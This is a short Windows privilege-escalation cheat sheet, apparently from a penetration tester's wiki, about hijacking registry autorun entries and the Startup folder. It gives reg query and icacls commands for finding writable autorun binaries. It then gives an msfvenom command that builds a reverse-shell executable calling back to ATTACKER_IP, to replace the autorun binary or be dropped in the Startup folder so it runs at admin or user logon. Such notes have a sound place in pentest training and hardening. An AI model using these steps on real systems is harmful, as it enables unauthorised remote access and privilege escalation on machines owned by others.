# Registry Autorun

Back to [[Windows-PrivEsc-Methodology]]

## Check Autorun Programs
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
```cmd
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## Check If Autorun Binary Is Writable
```cmd
icacls "C:\path\to\autorun.exe"
```

## Exploit

If writable, generate payload on Kali:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o autorun.exe
```

Replace the binary on target, wait for admin to log in (or trigger reboot if possible).

## Startup Folder

Also check:
```cmd
dir "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

If writable, drop a payload there -- executes on user login.
